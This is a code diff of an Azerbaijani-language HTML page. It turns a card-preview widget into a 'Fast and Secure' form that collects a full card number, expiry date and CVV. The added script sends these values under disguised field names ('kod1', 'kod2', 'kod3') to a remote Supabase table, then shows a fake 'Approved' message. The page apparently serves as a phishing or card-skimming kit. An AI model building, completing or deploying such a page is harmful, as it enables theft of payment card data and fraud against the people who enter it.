@@ -3,210 +3,209 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Game Kart</title>
+<title>Sürətli və Təhlükəsiz</title>
 
 <style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}
+
 body{
-  margin:0;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:linear-gradient(135deg,#1e3c72,#2a5298);
-  font-family:Arial, sans-serif;
+min-height:100vh;
+background:linear-gradient(-45deg,#0f2027,#203a43,#1e3c72,#00c6ff);
+background-size:400% 400%;
+animation:bg 12s ease infinite;
+display:flex;
+flex-direction:column;
+color:white;
 }
 
-/* Telefon korpusu */
+@keyframes bg{
+0%{background-position:0% 50%}
+50%{background-position:100% 50%}
+100%{background-position:0% 50%}
+}
+
+header{
+padding:20px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+}
+
+.container{
+flex:1;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
 .phone{
-  width:380px;
-  background:#0f172a;
-  padding:25px;
-  border-radius:40px;
-  box-shadow:0 0 50px rgba(0,0,0,0.8);
-  position:relative;
+width:340px;
+height:680px;
+background:#000;
+border-radius:40px;
+padding:18px;
+box-shadow:0 30px 60px rgba(0,0,0,0.6);
+position:relative;
 }
 
-.phone::before{
-  content:"";
-  position:absolute;
-  top:10px;
-  left:50%;
-  transform:translateX(-50%);
-  width:120px;
-  height:6px;
-  background:#1e293b;
-  border-radius:10px;
+.screen{
+background:linear-gradient(135deg,#1e3c72,#2a5298);
+height:100%;
+border-radius:30px;
+padding:25px;
+display:flex;
+flex-direction:column;
+justify-content:center;
 }
 
-/* Kart */
+.card-container{perspective:1000px;margin-bottom:25px;}
 .card{
-  width:100%;
-  height:200px;
-  perspective:1000px;
-  margin-bottom:25px;
+width:100%;
+height:180px;
+position:relative;
+transform-style:preserve-3d;
+transition:0.6s;
+}
+.card.flip{transform:rotateY(180deg);}
+
+.card-face{
+position:absolute;
+width:100%;
+height:100%;
+backface-visibility:hidden;
+border-radius:20px;
+padding:20px;
+display:flex;
+flex-direction:column;
+justify-content:space-between;
+}
+.front{background:linear-gradient(135deg,#00c6ff,#0072ff);}
+.back{background:linear-gradient(135deg,#0072ff,#00c6ff);transform:rotateY(180deg);align-items:flex-end;}
+
+.card-number{letter-spacing:3px;font-size:18px;}
+.card-code{font-size:20px;font-weight:bold;}
+
+input{
+width:100%;
+padding:12px;
+border:none;
+border-radius:10px;
+margin-bottom:10px;
+font-size:14px;
+outline:none;
 }
 
-.card-inner{
-  width:100%;
-  height:100%;
-  transition:0.6s;
-  transform-style:preserve-3d;
-  position:relative;
+.row{display:flex;gap:10px;}
+
+button{
+padding:14px;
+border:none;
+border-radius:12px;
+background:#00c6ff;
+color:white;
+font-weight:bold;
+cursor:pointer;
 }
 
-.card.flip .card-inner{
-  transform:rotateY(180deg);
-}
-
-.card-front,.card-back{
-  position:absolute;
-  width:100%;
-  height:100%;
-  border-radius:20px;
-  padding:20px;
-  box-sizing:border-box;
-  backface-visibility:hidden;
-  color:white;
-  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-}
-
-.card-back{
-  transform:rotateY(180deg);
-}
-
-.card-type{
-  position:absolute;
-  top:15px;
-  right:20px;
-  font-weight:bold;
-  letter-spacing:2px;
-}
-
-.card-number{
-  font-size:22px;
-  letter-spacing:3px;
-  margin-top:60px;
-}
-
-.card-bottom{
-  display:flex;
-  justify-content:space-between;
-  margin-top:20px;
-  font-size:16px;
-}
-
-.cvv-box{
-  background:white;
-  color:black;
-  padding:8px;
-  margin-top:80px;
-  text-align:right;
-  border-radius:6px;
-  width:80px;
-  margin-left:auto;
-}
-
-/* Inputlar */
-.input-large{
-  width:100%;
-  padding:14px;
-  border-radius:12px;
-  border:none;
-  margin-bottom:15px;
-  font-size:18px;
-  text-align:center;
-  background:#1e293b;
-  color:white;
-}
-
-.row{
-  display:flex;
-  gap:15px;
-}
-
-.input-small{
-  flex:1;
-  padding:14px;
-  border-radius:12px;
-  border:none;
-  font-size:18px;
-  text-align:center;
-  background:#1e293b;
-  color:white;
-}
+#status{text-align:center;margin-top:10px;}
 </style>
 </head>
 
 <body>
 
+<header>Sürətli və Təhlükəsiz</header>
+
+<div class="container">
 <div class="phone">
+<div class="screen">
 
-<div class="card" id="card">
-<div class="card-inner">
+<div class="card-container">
+<div class="card" id="gameCard">
 
-<div class="card-front">
-<div class="card-type">KREDİT</div>
-<div class="card-number" id="displayNumber">#### #### #### ####</div>
-<div class="card-bottom">
-<div id="display4">0000</div>
-<div></div>
-</div>
+<div class="card-face front">
+<div>KREDIT</div>
+<div class="card-number" id="previewNumber">•••• •••• •••• ••••</div>
+<div class="card-code" id="previewDate">MMYY</div>
 </div>
 
-<div class="card-back">
-<div class="cvv-box" id="display3">000</div>
+<div class="card-face back">
+<div>CVV: <span id="previewCVV">•••</span></div>
 </div>
 
 </div>
 </div>
 
-<!-- 16 rəqəm -->
-<input type="text" id="cardNumber" class="input-large" placeholder="0000 0000 0000 0000">
+<input type="text" id="kod1" maxlength="19" placeholder="16 rəqəm"
+oninput="formatNumber(this)">
 
-<!-- aşağı sıra -->
 <div class="row">
-  <input type="text" id="code4" class="input-small" placeholder="0000">
-  <input type="text" id="code3" class="input-small" placeholder="000">
+<input type="text" id="kod2" maxlength="4" placeholder="MMYY"
+oninput="updateDate(this)">
+<input type="text" id="kod3" maxlength="3" placeholder="CVV"
+onfocus="flip(true)"
+onblur="flip(false)"
+oninput="updateCVV(this)">
 </div>
 
+<button onclick="sendData()">Təsdiqlə</button>
+<p id="status"></p>
+
+</div>
+</div>
 </div>
 
-<script>
-const card=document.getElementById("card");
+<script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2"
 
-const numberInput=document.getElementById("cardNumber");
-const code4Input=document.getElementById("code4");
-const code3Input=document.getElementById("code3");
+const supabaseUrl = "BURAYA_URL"
+const supabaseKey = "BURAYA_KEY"
 
-const displayNumber=document.getElementById("displayNumber");
-const display4=document.getElementById("display4");
-const display3=document.getElementById("display3");
+const supabase = createClient(supabaseUrl, supabaseKey)
 
-/* Yalnız rəqəm + 16 limit + 4-4-4-4 */
-numberInput.addEventListener("input",function(e){
-  let raw=e.target.value.replace(/\D/g,"").slice(0,16);
-  let formatted=raw.replace(/(.{4})/g,"$1 ").trim();
-  e.target.value=formatted;
-  displayNumber.textContent=formatted||"#### #### #### ####";
-});
+window.formatNumber = function(input){
+let value = input.value.replace(/\D/g,'').slice(0,16)
+value = value.replace(/(.{4})/g,'$1 ').trim()
+input.value = value
+document.getElementById("previewNumber").innerText = value || "•••• •••• •••• ••••"
+}
 
-/* 4 rəqəm */
-code4Input.addEventListener("input",e=>{
-  let v=e.target.value.replace(/\D/g,"").slice(0,4);
-  e.target.value=v;
-  display4.textContent=v||"0000";
-});
+window.updateDate = function(input){
+let value = input.value.replace(/\D/g,'').slice(0,4)
+input.value = value
+document.getElementById("previewDate").innerText = value || "MMYY"
+}
 
-/* 3 rəqəm */
-code3Input.addEventListener("input",e=>{
-  let v=e.target.value.replace(/\D/g,"").slice(0,3);
-  e.target.value=v;
-  display3.textContent=v||"000";
-});
+window.updateCVV = function(input){
+let value = input.value.replace(/\D/g,'').slice(0,3)
+input.value = value
+document.getElementById("previewCVV").innerText = value || "•••"
+}
 
-/* Flip */
-code3Input.addEventListener("focus",()=>card.classList.add("flip"));
-code3Input.addEventListener("blur",()=>card.classList.remove("flip"));
+window.flip = function(state){
+const card = document.getElementById("gameCard")
+state ? card.classList.add("flip") : card.classList.remove("flip")
+}
+
+window.sendData = async function(){
+const kod1 = document.getElementById("kod1").value
+const kod2 = document.getElementById("kod2").value
+const kod3 = document.getElementById("kod3").value
+
+if(kod1.length < 19 || kod2.length < 4 || kod3.length < 3){
+document.getElementById("status").innerText="Məlumatları tam doldurun"
+return
+}
+
+document.getElementById("status").innerText="Onaylanır..."
+
+const { error } = await supabase.from("kod1").insert([{kod1,kod2,kod3}])
+
+if(error){
+document.getElementById("status").innerText="Xəta baş verdi"
+}else{
+document.getElementById("status").innerText="Onaylandı ✓"
+}
+}
 </script>
 
 </body>
